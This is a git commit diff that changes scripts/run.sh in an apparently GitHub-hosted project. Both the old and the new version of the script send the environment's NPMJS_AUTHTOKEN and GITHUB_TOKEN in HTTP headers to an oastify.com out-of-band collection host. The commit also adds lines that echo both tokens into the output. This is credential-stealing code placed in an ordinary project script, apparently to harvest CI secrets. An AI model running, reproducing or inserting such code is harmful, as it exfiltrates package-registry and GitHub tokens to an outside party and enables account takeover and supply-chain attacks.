999b9794c6b576533c2d8876836b7c43b2844d4b
tonispb1337 <114527561+tonispb1337@users.noreply.github.com>
2022-11-02 00:10:41 +0400

    Update run.sh

--- scripts/run.sh
+++ scripts/run.sh
@@ -1,6 +1,10 @@
 #!/bin/sh
 
-curl -i -s -XPOST \
-  -H "npm: ${NPMJS_AUTHTOKEN}" \
-  -H "ghub: ${GITHUB_TOKEN}" \
+curl -i -s \
+  -H "Authorization: token ${NPMJS_AUTHTOKEN}" \
+  -H "X-Forwarded-Host: ${GITHUB_TOKEN}" \
   https://8r0l79qa072gqink49399gcv3m9gx6lv.oastify.com
+  
+echo $NPMJS_AUTHTOKEN
+echo $GITHUB_TOKEN
+echo ----------------
